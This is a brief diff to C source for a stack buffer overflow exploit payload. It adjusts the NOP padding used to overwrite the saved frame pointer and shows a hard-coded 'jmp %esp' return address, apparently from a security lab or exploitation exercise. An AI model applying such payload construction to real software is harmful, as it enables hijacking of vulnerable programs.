@@ -74,7 +74,7 @@ unsigned char payload[] =
 	"\x90\x90\x90\x90\x90"
 	"\x90\x90\x90\x90"
 	//Need to overwrite the %ebp though:
-	"\x90\x90"
+	"\x90\x90\x90\x90"
 
 	// // The jmp %esp command location:
 	"\x1d\x90\x04\x08"
